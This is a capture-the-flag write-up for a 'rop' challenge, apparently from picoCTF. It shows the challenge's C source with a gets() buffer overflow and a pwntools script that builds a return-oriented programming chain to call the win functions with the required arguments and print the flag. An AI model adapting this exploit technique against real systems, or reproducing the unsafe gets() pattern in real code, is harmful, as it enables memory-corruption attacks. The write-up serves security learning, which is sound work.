ROP
---------------
Return Oriented Programming

We're given a binary and the source code (thanks pico <3)
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;


void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

So what we see here is that we need to SOMEHOW call win_function1(), win_function2(), and flag() while still passing the correct arguments to it.

Fortunately for us the input is not sanitized which means we can overflow the buffer a lot!
So looking at the code, we need to:
1. Call win_function1
2. call win_function2 with the argument 0xBAAAAAAD
3. call flag() with argument 0xDEADBAAD

In order to pass the arguments correctly, we need to find a way to pop arguments off of the stack. We can use a handy tool to find some
```ROPgadget --binary rop```

particularly, we are looking for
  `pop ebx ; ret`
which can be found at address `0x0804840d`

Time to setup our rop!
```Python
from pwn import *
import struct

sh = process("./rop")

proc = ELF('./rop')

raw_input()
pop_ret = 0x0804840d
addr_win1 = int(hex(proc.symbols['win_function1']),16)
print(type(addr_win1))
addr_win2 = int(hex(proc.symbols['win_function2']), 16)
addr_flag = int(hex(proc.symbols['flag']), 16)
addr_main = int(hex(proc.symbols['main']), 16)


payload = "A"*28
payload += p32(addr_win1)
payload += p32(addr_win2)
payload += p32(pop_ret)
payload += p32(0xBAAAAAAD)
payload += p32(addr_flag)
payload += p32(pop_ret)
payload += p32(0xDEADBAAD)

sh.sendline(payload)
sh.interactive()
```

and we have a flag!
